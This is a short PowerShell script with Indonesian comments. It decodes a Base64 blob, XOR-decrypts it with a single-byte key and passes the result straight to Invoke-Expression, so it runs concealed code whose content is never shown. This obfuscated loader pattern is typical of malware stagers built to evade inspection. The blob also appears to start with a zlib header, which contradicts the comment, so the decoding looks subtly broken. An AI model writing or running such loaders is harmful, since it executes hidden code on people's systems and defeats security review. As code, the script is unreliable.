# File: Osanaragi_simple.ps1
# Hanya Base64 + XOR tanpa kompresi zlib

$encodedData = [Convert]::FromBase64String("eJx9kM0OgjAMhu/9ijuSkQwYufgFgxcSosJhMyD2r4vjprC4NPVJ37z91hkAQMBC1pVLpTIdh1y3lCBfFh+KYv9k08yWqzz8q7m85yW7tlRDUV5Cdhp0zzIX14c8RppaqUqkI9LFi3Qe0PQR6wU4HpogMHZCeF3ZPxr4Yl3mSMsNl9rAFhGTWIlqPllqX32iNTG4IyM6j5p9DNN1V6w55M7Nz2cyKj/x1g/LsDUxT3PFmhPHyUG2vkvL4jsDb6qf")
$key = 0x47

# XOR Decrypt
$decryptedBytes = New-Object byte[] $encodedData.Length
for ($i = 0; $i -lt $encodedData.Length; $i++) {
    $decryptedBytes[$i] = $encodedData[$i] -bxor $key
}

# Convert to string and execute
$decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
Invoke-Expression $decryptedScript
